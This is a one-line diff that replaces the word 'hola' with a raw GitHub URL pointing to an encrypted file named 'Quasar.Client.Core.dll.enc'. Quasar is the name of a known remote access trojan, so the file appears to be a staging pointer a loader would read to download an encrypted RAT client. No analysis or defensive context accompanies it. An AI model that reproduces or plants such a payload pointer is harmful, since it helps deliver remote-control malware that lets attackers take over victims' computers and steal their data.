@@ -1,1 +1,1 @@
-hola
+https://raw.githubusercontent.com/trapsucom/storage-code/main/Quasar.Client.Core.dll.enc
